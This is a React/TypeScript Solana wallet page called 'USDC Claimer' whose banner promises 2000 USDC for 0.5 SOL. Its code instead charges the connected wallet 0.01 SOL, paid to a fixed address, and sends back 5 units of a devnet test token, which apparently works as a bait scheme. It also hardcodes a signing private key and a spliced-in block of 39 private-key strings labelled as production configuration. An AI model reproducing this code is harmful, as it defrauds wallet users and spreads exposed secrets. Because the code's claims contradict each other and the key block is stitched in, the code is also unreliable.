/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "62SWCdZkaFYNR21aMj6VeVm6BTxaDN4b24oM986pznXpaWEYPyamtCfDhNnj77YpRhuL9fdpp3cnfbtLp1S3Co6t"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4NWBYn4j6Ckty4ouCpMM2amsqqyXc1FdDLut4WnjB7FC7fY7JViwrzrMa39v1yUh9hnNY4srbmUAzjSnNmq6UHLb",
  "key1": "k52r9LvZ9jFuShU2WZkj4Njsc6SyWKtvDukHz5UvTdYTZPCjuDpjw6CdHnXLKkjt5NUMxBE1fVkajsCsdNJXhhA",
  "key2": "2BT4aSiTvvEDBxhMEiH7kXY4EPqWa9eZcEC7PB68uhRndjZCCCGXYNFWJVde3i4v7tuq4MbcxJ1rXA6mWN4zZnUL",
  "key3": "4NbjzUL5CwEbzZjJDZA8AupqJgcbHdrPHrQphijkHP6C3AteYmQmoLL44j49aWpWezXMXaYyg87XCEDFL3EhTBvN",
  "key4": "5svztiWjArcEMP11bFNyCJ5w8jma9RoEpkb9dGtQp9BguJ7xUH3vxCSU9GxWbspSSnJazr6Zk8b1xvtYts1sRkz5",
  "key5": "3GBrRB5BdTkXe9gxgT3nquzy6rR5Mt9SVE1wcmMgvvFeYo7DVUx157uULRT19zjY6zQxXBm4tp5xLTXLBQT3JmYT",
  "key6": "4ZEg9469uXstT7pa8zHkMsgQjeRfxJgF2cDRqKUi9h5evDtb8uJ8AFLY1T6EDaKVC6VsSZV9zUTYVsoAmH46jdQK",
  "key7": "qcgurtbz1y1FateQW67agNrYPQ21s7SBx6gTjgro1vNvGRKenS2CGbnHfkwcMg3qid4VXnamajhLU5FF9NvQFLQ",
  "key8": "5e1zFvnqMJBEeMvBK8ADw6ELXYz7UfYkyfLCmttHZ2Uj1Tq4rdiYGrfHY5ZgLWyTWsHoWXpDuNzNmcc1vvG3JinW",
  "key9": "4g37zhgGZwZKr7odrGgWf5HvEmGRk6QUxYBgQ1VZhR9gRjfzxxuaJuJA1Gxjod8oXNGswtX5X1xYUM9BLczS4Pnd",
  "key10": "3AY5zqJ2STgLwNnkVfihvytwEVFgiGDzco9T7BXTZX2RokAz6oD6ooCb43iNn9VmyyBnntejwPPqE2cb3tHrHa1J",
  "key11": "3ZRN5rZ3bj5fmxWHdCBo9PqYQAtT85qPtqMe7ddXUobhNjqwrPPe13YpHqpe9yyyEE2edQiT9huNoLCWYSHug1VM",
  "key12": "4dDmhc6apSGCDbw7d6iR4zUaWDuAzKPKfCVPrTLG9T6tZJiH4VUFeghMPKsoVJLyimuRXtSvZ4UZVsmLZ9ryTY9S",
  "key13": "4BvfZMER1dJvUnS2Ah48DRGfxKx5Vbj2vTT6ogzXPHB3aT84X3Eo67cCBXPnLjSzQyNftKcFPvUMmhuuBmLRBjQr",
  "key14": "22Fxpd3wSApoKgnus9LmXmSCxy7AuwAgPXeP4XqjA9VqcfAVscNWKnVb65Zd2vmRMV6xutUtRCVhEcXe8MTxDR97",
  "key15": "2UuHmJix6nrGXxEZAYWAgbFi6c7HYCk9rT2Q4yRTX6T96fXqEuazPa5wbjU834ycFQp6akmyh9JzUxjgSGWTSXsH",
  "key16": "36Jd92eFhXcS8QwAipzDTzvB2h4fSXTDHTUPhjWDgCtKrqtKCQ6gtxX7L3jVBrVXF1JRTLDX6KGqiirpg194Mv4f",
  "key17": "47dvaRhsrsbEz7brhTnZiLkRFCeX7HyfmVNbvFWi8cTjY1X5nSE7Dvm1PvwmGRhGLVgGDNUFHyHQLtqB5gsv8dW",
  "key18": "5Lj9qhMHitdWfXY778hsneFmKxTWGPNE69f2wt82ZJBEVfERC8MR7tgbDvbTbKSHtG6ckrKAuAcyQMnimaFCFqgi",
  "key19": "WXmuNagF8HsvBmp5LivX7SwRh818LsM9Nh52c3Y9YQ8TTQRzjQWRkpc9sapjTtu4JrpoEa2Mv39uw35sFzrxWhF",
  "key20": "4nE8273zFAMnXrW3G5LMA11Q2yy6SX37535H4RU2zZSVKdrYT16KvNC7xMikXGwVcE8BKMFr3u5VB1VQPGrrMxhi",
  "key21": "5kQQ8nbKj7ziB7hidD8MCZcUXuAno1KtLNZYD6eLAAsAiP3RQ2yMoRDXiw1pLwst7SvGsL9QM9V1a22J3tWQEM1j",
  "key22": "53xizRuhRETK8K6kBijdavnJhxaJhskqrnJEZA6Zzou45RAdG4sK42HqoNyb1GmA79b3ABtXWVbE1qwGEo3k9pxF",
  "key23": "5oK5mMxim4oRgC5EoPQPSPuvGMwMoWNJVMLeEhZCRdzDtpbxy1RdPtVJNcurn1kiAngGW5CJfoqMUEeQvoNREqyJ",
  "key24": "2x2qdpnkkvXvyHfuiszLTUtLUCtMihmftKNbGjfE3HHcxKCUvQgWAsZSvLsqo71ePjDA4Y2GGdKGJ9HnEqisXmyE",
  "key25": "GG9Ze4N47o9uekSrnGHSHS6haaD8HbaKGMG6gLZr1Xugh5GvJb1w6hMaaXwgavmvy6FZuvQakRj5XUr39zhCvVA",
  "key26": "42CUonxTrpKtCMVEoFjymgr8i3kC64ccEpPH1RiG26CFpYa9a5ENsjTq5cXVguNJTewSmw8RgzufKHt5eQfyUey",
  "key27": "kmfGNBBiYbBob9SnMPv7L8tCNzWVY8RMX1EpEXKjzr7Y48cTZ4CiANfEy8UpqzcW1gtSVDdBJzSimYLoW6TMPuL",
  "key28": "5Y53w2Q7fDjPgWT3HrCsoPekXo6CuhBuWNHPjotyVyTBDGTzVea1kLRdAzAufeYxDrbpdtPTEQzgYeQoTQP3dB8B",
  "key29": "39kijgpDDJMm2QmYaRDwUhbehPxZzbomexHhcZWKkBRBwnxbVsd8k8et6QroQMEHm1Ly7QrTEuKdCDi2WvjXZ86f",
  "key30": "4qGZqkuyTteijhurbAp7FAXyQGahX4gXcmvCCmUDgoZMohSx8VrAot43M4tf831CBWZPLg3ziESVh8S2FqXgypeR",
  "key31": "2XaiiuVLzt89HFGXYSNUtQBZyckkP1eGpKWusayJFnxa4mMPihcZCPuy6MVsWUBTgwrg1BNH5gow1tGTAV3hJTzo",
  "key32": "3EAUBcSSWas6ssDLjXX6Q25A6Njq5Tv6WhzwtxtQm99VPA2LExpSsEYE7EbX5AGojjoQDLbzWJER8LWLYvBF4hRi",
  "key33": "3ArxN4q9pDWikxBMRSCw8voVacbHn6znhYBnVfHty14689t4r25eL2N69zuMTBhbnRaqZtckNegdZ4qwBYCFQ4oy",
  "key34": "2YTiibfg6YNE9viTsBht3oYSfEyphTDJ2XMSkN4L4pzmb9BYdrbvb1qtYogEcgL3SzgxoM1echiUg2P4dtx8M5DR",
  "key35": "2eyQd4fj9iCzWb5Tx6kfpsCszCr49oSpXFaQNmPBAheJ4SwC9wS9MfFFpw7GwtswVqKAMZrRDj2XswRUYVwSf9nN",
  "key36": "4dteisGutBPHve4ToMS4JdQqaK7X3k5qVt2r8ZJpTNmn9iVek4DWPdiPoNtow9T9Ba5AgkcNV9Uxzt2MpYE9po7u",
  "key37": "2yWfMmkfYEkxgPxvk1SxXhaVnzGL7v5Crdj8kqPnTg4rzPQXS5w6qEz4fZgbnDwijrdnrkVpLzWu667KbGFFxvMV",
  "key38": "65cGv7VTiUKysYoNuiF1p9rwNHhDcEQeaB57VaDMKhS6CTWe6fCN29D2PKEgwU6JmEhphEbzQFjDpuWY8FeXXDho"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
